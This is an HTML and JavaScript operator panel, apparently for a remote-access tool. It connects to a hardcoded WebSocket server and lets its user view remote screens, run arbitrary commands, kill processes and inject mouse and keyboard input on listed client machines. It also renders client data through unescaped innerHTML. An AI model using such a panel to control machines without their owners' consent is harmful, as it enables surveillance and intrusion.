<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Remote Access Control</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: #1a1a1a;
    color: #fff;
    line-height: 1.4;
  }

  .container {
    max-width: 1400px;
    margin: 0 auto;
    padding: 20px;
  }

  header {
    text-align: center;
    margin-bottom: 20px;
  }

  h1 {
    font-size: 2.5rem;
    margin-bottom: 8px;
    color: #00ff88;
  }

  #connectionStatus {
    display: inline-block;
    padding: 5px 15px;
    border-radius: 20px;
    font-size: 0.9rem;
    font-weight: bold;
  }

  .status {
    &.connected {
      background-color: #00ff88;
      color: #000;
    }
    &.disconnected {
      background-color: #ff4444;
      color: #fff;
    }
  }

  /* Main Layout */
  .main {
    display: flex;
    flex-direction: row;
    gap: 20px;
    min-height: calc(100vh - 100px);
  }

  /* Sidebar: Clients List */
  .sidebar {
    flex: 1 1 250px;
    background-color: #2a2a2a;
    border-radius: 10px;
    padding: 15px;
    display: flex;
    flex-direction: column;
    max-height: calc(100vh - 100px);
    overflow-y: auto;
  }

  .sidebar h3 {
    margin-bottom: 15px;
    color: #00ff88;
    font-size: 1.2rem;
  }

  .client-list {
    display: flex;
    flex-direction: column;
    gap: 8px;
  }

  .client-item {
    background-color: #3a3a3a;
    padding: 10px;
    border-radius: 8px;
    cursor: pointer;
    transition: background-color 0.2s, transform 0.2s;
  }

  .client-item:hover {
    background-color: #4a4a4a;
    transform: translateY(-2px);
  }

  .client-item.selected {
    background-color: #00ff88;
    color: #000;
  }

  .client-header {
    display: flex;
    align-items: center;
    gap: 8px;
  }

  .client-status-indicator {
    width: 10px;
    height: 10px;
    border-radius: 50%;
  }

  .status-online {
    background-color: #00ff88;
  }

  .status-offline {
    background-color: #ff4444;
  }

  /* Main Panel */
  .main-panel {
    flex: 3 1 700px;
    background-color: #2a2a2a;
    border-radius: 10px;
    padding: 20px;
    display: flex;
    flex-direction: column;
    height: calc(100vh - 100px);
    overflow: hidden;
  }

  /* Client Info */
  .client-info {
    margin-bottom: 15px;
  }

  .client-info h3 {
    color: #00ff88;
    margin-bottom: 10px;
  }

  .info-row {
    display: flex;
    justify-content: space-between;
    margin-bottom: 6px;
  }

  /* Specs Grid */
  .specs-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
    gap: 10px;
    margin-top: 10px;
  }

  .spec-item {
    background-color: #3a3a3a;
    padding: 10px;
    border-radius: 6px;
    text-align: center;
  }

  /* Controls Buttons */
  .buttons {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    margin-bottom: 20px;
  }

  .btn {
    flex: 1 1 150px;
    padding: 12px;
    border: none;
    border-radius: 6px;
    font-weight: bold;
    cursor: pointer;
    transition: background-color 0.2s;
    font-size: 1rem;
  }

  .btn-primary {
    background-color: #00ff88;
    color: #000;
  }

  .btn-primary:hover {
    background-color: #00cc66;
  }

  .btn-danger {
    background-color: #ff4444;
    color: #fff;
  }

  .btn-danger:hover {
    background-color: #cc0000;
  }

  /* Tabs */
  .tabs {
    display: flex;
    margin-bottom: 15px;
  }

  .tab {
    flex: 1;
    padding: 10px;
    text-align: center;
    background-color: #1a1a1a;
    border-radius: 6px 6px 0 0;
    cursor: pointer;
    font-weight: bold;
    transition: background-color 0.2s;
  }

  .tab.active {
    background-color: #00ff88;
    color: #000;
  }

  /* Tab Contents */
  .tab-content {
    flex: 1;
    display: none;
    overflow: auto;
    background-color: #000;
    border-radius: 0 0 6px 6px;
    padding: 10px;
    height: calc(100% - 50px);
  }

  .tab-content.active {
    display: block;
  }

  /* Screen View */
  .screen-view {
    width: 100%;
    height: 100%;
    background-color: #000;
    border-radius: 8px;
    position: relative;
    overflow: hidden;
  }

  .screen-image {
    width: 100%;
    height: 100%;
    object-fit: contain;
    cursor: crosshair;
    display: none; /* initial hidden */
  }

  /* Terminal */
  .terminal {
    display: flex;
    flex-direction: column;
    height: 100%;
  }

  #cmdOutput {
    flex: 1;
    background-color: #000;
    color: #00ff00;
    padding: 10px;
    font-family: 'Courier New', monospace;
    font-size: 0.9rem;
    overflow-y: auto;
    border-radius: 6px;
    margin-bottom: 10px;
  }

  .cmd-input {
    display: flex;
    gap: 10px;
  }

  .cmd-input input {
    flex: 1;
    padding: 10px;
    background-color: #3a3a3a;
    border: none;
    border-radius: 6px;
    color: #fff;
    font-family: 'Courier New', monospace;
  }

  .cmd-input button {
    padding: 10px 20px;
    background-color: #00ff88;
    border: none;
    border-radius: 6px;
    font-weight: bold;
    cursor: pointer;
    transition: background-color 0.2s;
  }

  .cmd-input button:hover {
    background-color: #00cc66;
  }

  /* Task Manager */
  .task-manager {
    display: flex;
    flex-direction: column;
    height: 100%;
  }

  .process-list {
    flex: 1;
    overflow-y: auto;
    background-color: #000;
    border-radius: 6px;
    padding: 8px;
  }

  .process-header {
    display: grid;
    grid-template-columns: 60px 1fr 80px 100px 60px;
    gap: 8px;
    padding: 6px 0;
    font-weight: bold;
    color: #00ff88;
  }

  .process-item {
    display: grid;
    grid-template-columns: 60px 1fr 80px 100px 60px;
    gap: 8px;
    padding: 6px 0;
    border-bottom: 1px solid #333;
    align-items: center;
  }

  .kill-btn {
    padding: 4px 8px;
    background-color: #ff4444;
    border: none;
    border-radius: 4px;
    color: #fff;
    cursor: pointer;
    font-size: 0.8rem;
    transition: background-color 0.2s;
  }

  .kill-btn:hover {
    background-color: #cc0000;
  }

  /* Responsive adjustments */
  @media(max-width: 1024px) {
    body {
      font-size: 0.9rem;
    }
    .main {
      flex-direction: column;
    }
    .main {
      height: auto;
    }
    .sidebar {
      max-height: 200px;
    }
  }
</style>
</head>
<body>
<div class="container">
  <header>
    <h1>Remote Access Control</h1>
    <div id="connectionStatus" class="status disconnected">Getrennt</div>
  </header>
  <div class="main">
    <!-- Sidebar: Clients List -->
    <aside class="sidebar">
      <h3>Verbundene Clients</h3>
      <div id="clientList" class="client-list">
        <div class="no-client">Keine Clients verbunden</div>
      </div>
    </aside>
    <!-- Main Panel -->
    <section class="main-panel">
      <!-- Client Info -->
      <div id="clientDetails" class="client-info" style="display: none;">
        <h3>Client Informationen</h3>
        <div class="info-row"><strong>Benutzername:</strong> <span id="clientUsername">-</span></div>
        <div class="info-row"><strong>IP Adresse:</strong> <span id="clientIP">-</span></div>
        <div class="info-row"><strong>Session ID:</strong> <span id="clientSessionID">-</span></div>
        <div class="info-row"><strong>OS:</strong> <span id="clientOS">-</span></div>
        <div class="info-row"><strong>Hostname:</strong> <span id="clientHostname">-</span></div>
        <!-- System Specs -->
        <div class="specs-grid">
          <div class="spec-item"><div>CPU Kerne</div><div id="cpuCores">-</div></div>
          <div class="spec-item"><div>CPU Auslastung</div><div id="cpuUsage">-</div></div>
          <div class="spec-item"><div>RAM Total</div><div id="ramTotal">-</div></div>
          <div class="spec-item"><div>RAM Verfügbar</div><div id="ramAvailable">-</div></div>
        </div>
        <!-- Controls -->
        <div class="buttons" style="margin-top:15px;">
          <button class="btn btn-primary" onclick="startScreenShare()">Screen Share starten</button>
          <button class="btn btn-primary" onclick="stopScreenShare()">Screen Share stoppen</button>
          <button class="btn btn-primary" onclick="refreshProcesses()">Prozesse aktualisieren</button>
          <button class="btn btn-danger" onclick="disconnectClient()">Client trennen</button>
        </div>
        <!-- Tabs -->
        <div class="tabs">
          <div class="tab active" onclick="switchTab('screen')">Bildschirm</div>
          <div class="tab" onclick="switchTab('cmd')">Terminal</div>
          <div class="tab" onclick="switchTab('taskmanager')">Task Manager</div>
        </div>
        <!-- Tab Contents -->
        <div class="tab-content active" id="screen">
          <div class="screen-view">
            <img id="screenImage" class="screen-image" src="" alt="Bildschirm" />
            <div id="screenPlaceholder" style="width:100%; height:100%; display:flex; align-items:center; justify-content:center; color:#666;">Screen Share nicht aktiv</div>
          </div>
        </div>
        <div class="tab-content" id="cmd">
          <div class="terminal" style="height:100%; display:flex; flex-direction:column;">
            <div id="cmdOutput"></div>
            <div class="cmd-input" style="margin-top:10px;">
              <input type="text" id="cmdInput" placeholder="Befehl eingeben..." onkeypress="if(event.key==='Enter'){executeCommand();}">
              <button onclick="executeCommand()">Ausführen</button>
            </div>
          </div>
        </div>
        <div class="tab-content" id="taskmanager">
          <div class="task-manager" style="height:100%; display:flex; flex-direction:column;">
            <div class="process-list" id="processList">
              <div class="process-header">
                <div>PID</div>
                <div>Name</div>
                <div>CPU %</div>
                <div>Speicher</div>
                <div>Aktion</div>
              </div>
              <!-- Prozesse werden hier eingefügt -->
            </div>
          </div>
        </div>
      </div>
      <!-- Keine Client ausgewählt -->
      <div id="noClientSelected" style="text-align:center; margin-top:50px; font-size:1.2rem; color:#666;">
        Wählen Sie einen Client aus der Liste aus
      </div>
    </section>
  </div>
</div>

<script>
  let ws = null;
  let selectedClient = null;
  let clients = {};
  let screenShareActive = false;

  function connectWebSocket() {
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = "wss://myman-w8p4.onrender.com/ws/controller/";
    ws = new WebSocket(wsUrl);
    ws.onopen = () => {
      updateConnectionStatus(true);
      requestClientList();
    };
    ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      handleWebSocketMessage(data);
    };
    ws.onclose = () => {
      updateConnectionStatus(false);
      setTimeout(connectWebSocket, 3000);
    };
    ws.onerror = () => {
      updateConnectionStatus(false);
    };
  }

  function updateConnectionStatus(connected) {
    const statusEl = document.getElementById('connectionStatus');
    if (connected) {
      statusEl.textContent = 'Verbunden';
      statusEl.className = 'status connected';
    } else {
      statusEl.textContent = 'Getrennt';
      statusEl.className = 'status disconnected';
    }
  }

  function handleWebSocketMessage(data) {
    switch(data.type) {
      case 'client_list': updateClientList(data.clients); break;
      case 'screen_frame': updateScreenShare(data); break;
      case 'cmd_result': displayCommandResult(data); break;
      case 'process_list': updateProcessList(data.processes); break;
      case 'process_killed': handleProcessKilled(data); break;
    }
  }

  function requestClientList() {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'get_client_list' }));
    }
  }

  function updateClientList(clientList) {
    clients = {};
    const listEl = document.getElementById('clientList');
    listEl.innerHTML = '';

    if (clientList.length === 0) {
      listEl.innerHTML = '<div class="no-client">Keine Clients verbunden</div>';
      return;
    }

    clientList.forEach(client => {
      clients[client.client_id] = client;
      const item = document.createElement('div');
      item.className = 'client-item';
      item.onclick = () => selectClient(client.client_id);
      item.innerHTML = `
        <div class="client-header">
          <div class="client-status-indicator ${client.status}"></div>
          <div>${client.username}</div>
        </div>
        <div style="font-size:0.8rem; margin-top:4px;">
          IP: ${client.ip} | OS: ${client.os} | Session: ${client.session_id}
        </div>`;
      listEl.appendChild(item);
    });
  }

  function selectClient(clientId) {
    selectedClient = clientId;
    const client = clients[clientId];

    // Alle markieren
    document.querySelectorAll('.client-item').forEach(el => el.classList.remove('selected'));
    event.currentTarget.classList.add('selected');

    // Infos anzeigen
    document.getElementById('clientDetails').style.display = 'block';
    document.getElementById('noClientSelected').style.display = 'none';

    document.getElementById('clientUsername').textContent = client.username;
    document.getElementById('clientIP').textContent = client.ip;
    document.getElementById('clientSessionID').textContent = client.session_id;
    document.getElementById('clientOS').textContent = client.os;
    document.getElementById('clientHostname').textContent = client.hostname;

    if (client.specs) {
      document.getElementById('cpuCores').textContent = client.specs.cpu_count || '-';
      document.getElementById('cpuUsage').textContent = client.specs.cpu_percent ? client.specs.cpu_percent.toFixed(1) + '%' : '-';
      document.getElementById('ramTotal').textContent = client.specs.memory_total ? formatBytes(client.specs.memory_total) : '-';
      document.getElementById('ramAvailable').textContent = client.specs.memory_available ? formatBytes(client.specs.memory_available) : '-';
    }
  }

  function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  }

  function switchTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    event.currentTarget.classList.add('active');
    document.getElementById(tabName).classList.add('active');
  }

  function sendControlMessage(action, data={}) {
    if (!selectedClient || !ws || ws.readyState !== WebSocket.OPEN) {
      alert('Kein Client verbunden!');
      return;
    }
    const client = clients[selectedClient];
    ws.send(JSON.stringify({
      type: 'control_client',
      session_id: client.session_id,
      action: action,
      ...data
    }));
  }

  // Funktionen für Buttons
  function startScreenShare() { sendControlMessage('start_screen_share'); screenShareActive=true; toggleScreenShare(true); }
  function stopScreenShare() { sendControlMessage('stop_screen_share'); screenShareActive=false; toggleScreenShare(false); }
  function toggleScreenShare(active) {
    document.getElementById('screen').style.display = active ? 'block' : 'none';
    document.getElementById('screenPlaceholder').style.display = active ? 'none' : 'flex';
    document.getElementById('screenImage').style.display = active ? 'block' : 'none';
  }

  function updateScreenShare(data) {
    if (screenShareActive && data.session_id === clients[selectedClient]?.session_id) {
      const img = document.getElementById('screenImage');
      img.src = 'data:image/jpeg;base64,' + data.image;
    }
  }

  function executeCommand() {
    const input = document.getElementById('cmdInput');
    const cmd = input.value.trim();
    if (!cmd) return;
    const outputEl = document.getElementById('cmdOutput');
    outputEl.innerHTML += `<div style="color:#0f0;">$ ${cmd}</div>`;
    sendControlMessage('cmd_execute', { command: cmd });
    input.value = '';
  }

  function displayCommandResult(data) {
    const outputEl = document.getElementById('cmdOutput');
    if (data.error) {
      outputEl.innerHTML += `<div style="color:#f00;">Fehler: ${data.error}</div>`;
    } else {
      if (data.stdout) {
        outputEl.innerHTML += `<div>${data.stdout.replace(/\n/g, '<br>')}</div>`;
      }
      if (data.stderr) {
        outputEl.innerHTML += `<div style="color:#f00;">${data.stderr.replace(/\n/g, '<br>')}</div>`;
      }
    }
    outputEl.scrollTop = outputEl.scrollHeight;
  }

  function refreshProcesses() {
    sendControlMessage('get_processes');
  }

  function updateProcessList(processes) {
    const list = document.getElementById('processList');
    list.innerHTML = '';

    processes.forEach(proc => {
      const row = document.createElement('div');
      row.className = 'process-item';
      row.innerHTML = `
        <div>${proc.pid}</div>
        <div>${proc.name}</div>
        <div>${proc.cpu_percent ? proc.cpu_percent.toFixed(1)+'%' : '0%'}</div>
        <div>${formatBytes(proc.memory)}</div>
        <div><button class="kill-btn" onclick="killProcess(${proc.pid})">Kill</button></div>
      `;
      list.appendChild(row);
    });
  }

  function killProcess(pid) {
    if (confirm(`Prozess mit PID ${pid} wirklich beenden?`)) {
      sendControlMessage('kill_process', { pid });
    }
  }

  function handleProcessKilled(data) {
    if (data.success) {
      alert(`Prozess ${data.pid} beendet`);
      refreshProcesses();
    } else {
      alert(`Fehler: ${data.error}`);
    }
  }

  function disconnectClient() {
    if (confirm('Client wirklich trennen?')) {
      // Hier kannst du eine spezielle Trennfunktion implementieren
    }
  }

  // Maus- und Tastatursteuerung für Screen Share
  document.getElementById('screenImage').addEventListener('click', (e) => {
    if (!screenShareActive) return;
    const rect = e.target.getBoundingClientRect();
    const x = Math.round((e.clientX - rect.left) * (e.target.naturalWidth / rect.width));
    const y = Math.round((e.clientY - rect.top) * (e.target.naturalHeight / rect.height));
    sendControlMessage('mouse_control', { action: 'click', x, y });
  });
  document.getElementById('screenImage').addEventListener('contextmenu', (e) => {
    e.preventDefault();
    if (!screenShareActive) return;
    const rect = e.target.getBoundingClientRect();
    const x = Math.round((e.clientX - rect.left) * (e.target.naturalWidth / rect.width));
    const y = Math.round((e.clientY - rect.top) * (e.target.naturalHeight / rect.height));
    sendControlMessage('mouse_control', { action: 'right_click', x, y });
  });
  document.getElementById('screenImage').addEventListener('dblclick', (e) => {
    if (!screenShareActive) return;
    const rect = e.target.getBoundingClientRect();
    const x = Math.round((e.clientX - rect.left) * (e.target.naturalWidth / rect.width));
    const y = Math.round((e.clientY - rect.top) * (e.target.naturalHeight / rect.height));
    sendControlMessage('mouse_control', { action: 'double_click', x, y });
  });
  document.getElementById('screenImage').addEventListener('mousemove', (e) => {
    if (!screenShareActive) return;
    const rect = e.target.getBoundingClientRect();
    const x = Math.round((e.clientX - rect.left) * (e.target.naturalWidth / rect.width));
    const y = Math.round((e.clientY - rect.top) * (e.target.naturalHeight / rect.height));
    sendControlMessage('mouse_control', { action: 'move', x, y });
  });

  document.addEventListener('keydown', (e) => {
    if (!screenShareActive || document.activeElement.tagName === 'INPUT') return;
    e.preventDefault();
    if (e.ctrlKey && e.key.toLowerCase() === 'c') {
      sendControlMessage('keyboard_control', { action: 'hotkey', keys: ['ctrl', 'c'] });
    } else if (e.ctrlKey && e.key.toLowerCase() === 'v') {
      sendControlMessage('keyboard_control', { action: 'hotkey', keys: ['ctrl', 'v'] });
    } else if (e.key.length === 1) {
      sendControlMessage('keyboard_control', { action: 'type', text: e.key });
    } else {
      sendControlMessage('keyboard_control', { action: 'press', key: e.key.toLowerCase() });
    }
  });

  window.addEventListener('load', () => {
    connectWebSocket();
  });
</script>
</body>
</html>